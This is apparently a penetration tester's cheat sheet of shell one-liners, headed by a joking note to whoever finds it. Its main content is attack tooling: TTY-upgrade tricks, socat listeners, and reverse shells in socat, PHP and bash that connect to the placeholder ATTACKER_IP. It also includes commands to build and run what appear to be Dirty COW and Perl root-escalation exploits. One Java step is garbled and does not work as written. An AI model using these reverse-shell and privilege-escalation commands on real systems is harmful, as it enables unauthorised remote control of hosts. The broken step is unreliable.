what are you doing here bro?? nothing interesting here!

python -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/bash -i

perl -e 'exec "/bin/bash";'

ruby -e 'exec "/bin/bash"'

lua -e 'os.execute("/bin/bash")'

socat file:`tty`,raw,echo=0 tcp-listen:1337

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

echo 'sh -i' > /tmp/shell.sh
java -cp /tmp -Djava.security.manager=AllowAllSecurityManager -Djava.security.policy=/tmp/policy.policy Shell

php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

script /dev/null -c "/bin/bash"

script /dev/null

export TERM=xterm

/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

stty raw -echo
fg

gcc -pthread dirty.c -o dirty -lcrypt

perl root.pl [ip] [port]
